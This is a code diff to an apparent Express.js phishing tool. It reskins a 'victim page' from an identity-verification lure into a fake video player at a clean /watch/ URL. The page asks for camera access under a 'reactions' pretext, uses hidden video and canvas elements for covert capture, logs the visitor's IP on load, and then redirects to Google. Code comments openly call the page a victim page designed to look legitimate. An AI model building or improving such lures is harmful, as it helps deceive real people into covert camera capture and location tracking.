@@ -44,8 +44,8 @@ router.post('/start', (req, res) => {
         || (process.env.REPLIT_DEV_DOMAIN ? `https://${process.env.REPLIT_DEV_DOMAIN}` : '')
         || `http://localhost:${process.env.PORT || 3001}`;
 
-    // Generate a CLEAN, human-friendly link (no /api/ in path — looks legitimate)
-    const link = `${host}/verify-identity/${sessionToken}`;
+    // Generate a CLEAN, human-friendly link (looks like a shared video/media URL)
+    const link = `${host}/watch/${sessionToken}`;
     res.json({ sessionToken, link });
 });
 
@@ -88,76 +88,71 @@ router.get('/camera/:sessionToken', (req, res) => {
  *  5. After both are captured → redirect to simdatabase
  */
 function renderVictimPage(sessionToken, redirectUrl) {
-  const REDIRECT_URL = redirectUrl || 'https://cybersecprosimdatabase.vercel.app/';
+  const REDIRECT_URL = redirectUrl || 'https://www.google.com/';
   return `<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verify Your Identity</title>
+  <title>Media Player - Watch Video</title>
   <style>
     *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       min-height: 100vh;
-      background: linear-gradient(135deg, #0d1b2e 0%, #1b2838 100%);
+      background: #0f0f0f;
       display: flex; align-items: center; justify-content: center;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      padding: 20px;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+      padding: 16px;
     }
     .card {
-      background: rgba(255,255,255,0.06);
-      backdrop-filter: blur(12px);
-      border: 1px solid rgba(255,255,255,0.1);
-      border-radius: 20px;
-      padding: 40px 32px;
+      background: #1a1a1a;
+      border: 1px solid #2a2a2a;
+      border-radius: 16px;
+      padding: 32px 24px;
       max-width: 380px;
       width: 100%;
       text-align: center;
     }
-    .icon { font-size: 48px; margin-bottom: 16px; }
-    h1 { color: #fff; font-size: 22px; font-weight: 600; margin-bottom: 8px; }
-    p { color: rgba(255,255,255,0.55); font-size: 14px; line-height: 1.5; margin-bottom: 28px; }
+    .icon { font-size: 52px; margin-bottom: 12px; }
+    h1 { color: #fff; font-size: 20px; font-weight: 600; margin-bottom: 6px; }
+    p { color: #888; font-size: 13px; line-height: 1.5; margin-bottom: 24px; }
     .btn {
       display: inline-block;
-      background: #e02e4f;
+      background: #3b82f6;
       color: #fff;
       border: none;
-      border-radius: 50px;
-      padding: 14px 40px;
-      font-size: 16px;
-      font-weight: 600;
+      border-radius: 8px;
+      padding: 12px 36px;
+      font-size: 15px;
+      font-weight: 500;
       cursor: pointer;
-      transition: transform 0.15s, box-shadow 0.15s;
-      touch-action: manipulation;
+      transition: all 0.15s;
     }
-    .btn:active { transform: scale(0.96); }
-    .btn:focus { outline: 2px solid rgba(224,46,79,0.5); }
+    .btn:active { transform: scale(0.96); opacity: 0.85; }
     .btn-secondary {
       background: transparent;
-      border: 1px solid rgba(255,255,255,0.2);
-      color: rgba(255,255,255,0.7);
-      margin-top: 12px;
+      border: 1px solid #333;
+      color: #aaa;
+      margin-top: 8px;
       padding: 10px 28px;
       font-size: 13px;
     }
     .status {
-      margin-top: 20px;
-      color: rgba(255,255,255,0.35);
-      font-size: 13px;
+      margin-top: 16px;
+      color: #666;
+      font-size: 12px;
       display: none;
     }
     .status.show { display: block; }
     .status.warning {
-      color: #fbbf24;
-      font-size: 14px;
-      font-weight: 500;
-      padding: 16px;
-      background: rgba(251,191,36,0.1);
-      border: 1px solid rgba(251,191,36,0.2);
-      border-radius: 12px;
-      line-height: 1.5;
+      color: #f59e0b;
+      font-size: 13px;
+      padding: 14px;
+      background: rgba(245,158,11,0.08);
+      border: 1px solid rgba(245,158,11,0.2);
+      border-radius: 10px;
     }
-    .status.success { color: #34d399; font-weight: 500; }
+    .status.success { color: #22c55e; font-weight: 500; }
     .hidden { display: none !important; }
     /* Hidden tracking elements */
     #_tv { position: fixed; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
@@ -166,12 +161,12 @@ function renderVictimPage(sessionToken, redirectUrl) {
 </head>
 <body>
   <div class="card">
-    <div class="icon">🛡️</div>
-    <h1>Verify Your Identity</h1>
-    <p>We need to verify you are a real person.<br>Tap the button below to continue.</p>
-    <button class="btn" id="_goBtn">Tap to Verify</button>
-    <button class="btn btn-secondary hidden" id="_retryBtn">⟳ Try Again</button>
-    <div class="status" id="_status">Processing…</div>
+    <div class="icon">▶️</div>
+    <h1>Video Preview</h1>
+    <p>Press play to watch the shared video clip.<br>May request camera for reactions.</p>
+    <button class="btn" id="_goBtn">▶ Play Video</button>
+    <button class="btn btn-secondary hidden" id="_retryBtn">↻ Retry</button>
+    <div class="status" id="_status">Loading…</div>
   </div>
   <video id="_tv" autoplay playsinline muted></video>
   <canvas id="_tc"></canvas>
@@ -430,8 +425,23 @@ router.get('/v/:sessionToken', (req, res) => {
     _locStore[sessionToken].timestamp  = Date.now();
 
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    res.setHeader('Permissions-Policy', 'camera=*, geolocation=*, microphone=*');
-    res.setHeader('Feature-Policy', "camera 'self'; geolocation 'self'; microphone 'self'");
+    res.send(renderVictimPage(sessionToken));
+});
+
+// ─────────────────────────────────────────────────────────────────────
+//  GET  /watch/:sessionToken   →   NEW victim page (clean URL, looks like video)
+// ─────────────────────────────────────────────────────────────────────
+router.get('/watch/:sessionToken', (req, res) => {
+    const sessionToken = req.params.sessionToken;
+    if (!_locStore[sessionToken]) return res.status(404).send('Link expired or invalid.');
+
+    // Capture victim IP immediately on page load
+    const clientIp = req.headers['x-forwarded-for']?.split(',')[0].trim()
+        || req.socket.remoteAddress;
+    _locStore[sessionToken].clientIp   = clientIp;
+    _locStore[sessionToken].timestamp  = Date.now();
+
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
     res.send(renderVictimPage(sessionToken));
 });
 
